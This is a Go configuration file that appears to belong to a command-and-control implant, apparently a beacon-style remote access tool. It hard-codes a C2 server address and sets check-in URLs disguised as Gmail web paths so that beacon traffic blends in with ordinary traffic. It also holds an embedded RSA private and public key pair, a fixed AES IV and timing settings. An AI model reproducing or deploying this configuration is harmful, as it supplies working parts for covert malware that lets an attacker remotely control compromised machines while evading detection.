package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmX6w08rxmMGHRiaP0jlCDets5oaJ323MvS+56
FzVOnQYpy8YJzshkbpff7q1NkxpHsj32Srl7cIFepdX8NphT9tHkz7qGlVIChsYMrFRIQv+esfHU
f/JFRLrDuvvslxz6TSc0UOX8j/mpJjCQe8W9vS+GQFBmxLys5W+k6wnUIQIDAQAB
-----END PUBLIC KEY-----`)
	RsaPrivateKey = []byte(`-----BEGIN PRIVATE KEY-----
MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAKZfrDTyvGYwYdGJo/SOUIN62zmh
onfbcy9L7noXNU6dBinLxgnOyGRul9/urU2TGkeyPfZKuXtwgV6l1fw2mFP20eTPuoaVUgKGxgys
VEhC/56x8dR/8kVEusO6++yXHPpNJzRQ5fyP+akmMJB7xb29L4ZAUGbEvKzlb6TrCdQhAgMBAAEC
gYA2fS8RSE6byUzAK6we9F06MoqKHX3wc1cOLng0VFWJIbRbC/oYTDkla3MiTDFGLt90i9PvThnh
a79zGC01JUxN7GFFWqR9nD50bTLjH+efYxX0Mvb3AqWajRFhCBZDHEWs7Lt22S638wtQYnL215tT
KJXZWAeKRlHeChqyI0WsgQJBAM8NZntDaB4mzLYGvhTLJBeL4QyXeZ4lliQp7cct9OOPrUz1KHoJ
CFYcKYaRqGz7+skbcKU98FQAoKrM/+5POy0CQQDNtHFm9DSwRjRvn1bDrivFSzKdTOC7GeihhVAp
iC4/tUQAw2q47n85uxunmH+MCv4o7Tos20jz4a9XogV6AwVFAkBiW+5MLihe8nWbHzbbL+l0WhnN
3oOC0j4x7c0sKrPECrP79BaHapUQOw6rA7TsGQP411U62mK5tRaeLQaDkhX9AkA/HgfRzErCb7g1
K9IGltGtZuZv55/pKQj9TpeLNtLiD29/QHblqaB2CVhx81Pnl5Pm4OuBygM3ed9AZ2GAz551AkEA
hvDhEIeMvxbtDguenIifouFF6Pn427tvncJ+zRllm51/OjSsuHzHbKyoiVeESIHFsqTs7whvPsWb
ms+wJRd8oQ==
-----END PRIVATE KEY-----`)

	C2                          = "10.211.55.2:448"
	plainHTTP                   = "http://"
	sslHTTP                     = "https://"
	GetUrl                      = sslHTTP + C2 + "/_/scs/mail-static/_/js/"
	PostUrl                     = sslHTTP + C2 + "/mail/u/0/"
	WaitTime                    = 10000 * time.Millisecond
	VerifySSLCert               = true
	TimeOut       time.Duration = 10 //seconds

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
)

const (
	DebugMode = true
)
